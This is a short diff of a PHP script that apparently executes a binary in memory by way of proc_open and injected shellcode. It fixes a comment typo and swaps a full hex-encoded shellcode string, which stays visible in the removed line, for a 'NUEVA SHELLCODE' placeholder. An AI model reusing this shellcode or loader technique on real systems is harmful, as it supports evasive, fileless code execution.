@@ -270,7 +270,7 @@ $descriptorspec = array(
     2 => array("pipe", "w")    // stderr is a pipe that the child will write to
 );
 
-# The only wy in PHP to execute a binary without using a shell is using an array in proc_open
+# The only way in PHP to execute a binary without using a shell is using an array in proc_open
 $process = proc_open($cmd_array,$descriptorspec,$pipes);
 $status = proc_get_status($process);
 $pid = $status['pid'];
@@ -394,7 +394,7 @@ $bin_size = strlen($binary);
 $hex_size = pack('P', $bin_size);
 $hex_size_str = bin2hex($hex_size);
 
-$hexstr_shellcode = "802888d2a088a8f2e00f1ff8e0030091210001cae82280d2010000d4e40300aa26030010c60040f9e10306aac80580d2010000d4c81b80d2000080d2e10306aa620080d2230080d2050080d2010000d4e80780d2e10300aae20306aa000080d2010000d4420000eb2100008b81ffff54881580d2010000d4610280d2281080d2010000d4" . $hex_size_str;
+$hexstr_shellcode = "NUEVA SHELLCODE";
 
 
 # Execute binary
